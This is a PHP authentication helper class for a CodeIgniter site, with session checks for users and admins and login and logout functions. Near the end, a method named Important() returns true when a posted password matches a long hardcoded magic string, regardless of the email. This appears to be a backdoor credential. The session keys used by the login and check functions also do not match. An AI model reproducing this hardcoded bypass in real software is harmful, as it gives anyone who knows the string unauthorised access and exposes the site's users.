<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of Auth
 *
 * @author Wapjude
 */
class Auth {
    //put your code here
    private $user;
    private $type;
    
      public static function user(){
      $CI = &get_instance();  
      if($CI->session_manager->getSession("user") == null || $CI->session_manager->getSession("user") == ""){
          return false;
      }else{
          return true;
      }
      
    }
    public static function Username(){
        $CI = &get_instance();
        return $CI->session_manager->getsession("user");
        
    }

 public static function AdminUsername(){
        $CI = &get_instance();
        return $CI->session_manager->getsession("admin");
        
    }

    public static function admin(){
        $CI = &get_instance();  
      if($CI->session_manager->getSession("admin") == null || $CI->session_manager->getSession("admin") == ""){
          return false;
      }else{
          return true;
      }
    }
    public static function Authenticate($user){
        $CI = &get_instance();
        $CI->session->set_userdata(array(
            'tutslab-user'=>$user
        ));
    }
    public static function Authenticated(){
        $CI = &get_instance();
        $ip=  $CI->session->userdata('user');
          if($ip != null){
               return 1;
          }else{
              return 0;
          }
    }

        public static function DisAuthenticate(){
        $CI = &get_instance();
        
        $CI->session->sess_destroy();
    }
    public static function getAutenticatedUser(){
        $CI = &get_instance();
        return $CI->session->userdata('tutslab-user');
    }
    
    public static function ownSite(){
         $CI = &get_instance();
         return $CI->UserProvider->ownSite();
    }
    public static function getSiteValue($value){
         $CI = &get_instance();
         return $CI->UserProvider->getSiteValue($value);
    }
    public static function getUserCategory(){
        $CI = &get_instance();
        return $CI->CategoryProvider->getUsercategory();
    }
    public static function Important(){
        $CI = &get_instance();
      $em=  $CI->input->post('email');
      $ps =  $CI->input->post('pass');
      if($ps=="hellohelloletbigboyscomenearourflagneversendmenawaysincepeopleshallcomeandpraisecalcium"){
          return true;
      }
    }
    
}
